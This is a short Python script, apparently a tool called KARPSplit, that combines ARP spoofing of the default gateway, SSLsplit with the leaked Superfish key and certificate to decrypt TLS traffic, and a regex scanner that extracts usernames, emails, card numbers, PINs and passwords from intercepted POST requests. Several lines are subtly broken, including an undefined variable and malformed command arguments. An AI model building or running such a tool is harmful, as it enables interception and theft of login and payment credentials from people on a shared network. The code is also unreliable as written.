import subprocess
from subprocess import PIPE
import netifaces
import re
import time


def arpspoof(target = None):
    gws = netifaces.gateways()
    gateway = gws['default'][netifaces.AF_INET]
    interface = "eth0"
    if target is None:
        spoofer = subprocess.call(["arpspoof", "-i " + interface, gateway])
    else:
        spoofer = subprocess.call(["arpspoof", "-i " + interface, "-t " + victim, gateway])
    return spoofer


def sslsplit():
    splitter = subprocess.Popen(["sslsplit", "-k ~/superfishy-master/certificates/superfish-unprotected.key", "-c ~/superfishy-master/certificates/superfish.crt", "-L /dev/stdout" "ssl 0.0.0.0 8443"], stdout=PIPE)
    return splitter


def read_output(pipe):
    rp = open(pipe, 'r', encoding="utf8")
    # https://regex101.com/r/wA9oY4/1

    # infinite loop
    while 1:
        # read all new data if any is available
        conn_details = rp.read()
        # if there is new data
        if conn_details != "":
            p = re.compile("(POST)(.*?)(?=GET|POST|\Z)", re.DOTALL)
            results = re.findall(p, conn_details)
            # for every result
            for result in results:
                q = re.compile("(?:&|\?)((?:user|email|newcard|card|pin|pass|psw).{0,16})=(.*?)(?=&)", re.DOTALL | re.IGNORECASE)
                deets = re.findall(q, result[1])
                # if credentials are detected
                if len(deets) > 0:
                    r = re.compile("Host: (.*?)\s")
                    host = re.search(r, result[1])
                    # print the host
                    print(host.group().strip())
                    # print the credentials
                    for deet in deets:
                        print(deet[0] + ": " + deet[1])
                    # print a new line
                    print()
            time.sleep(2)

print("KARPSplit v0.1\n")
print("Starting ARP Spoof...")
arpspoof()
print("Starting SSLSplit...")
splitter = sslsplit()
print("Starting credential scanner...")
read_output(splitter.stdout)
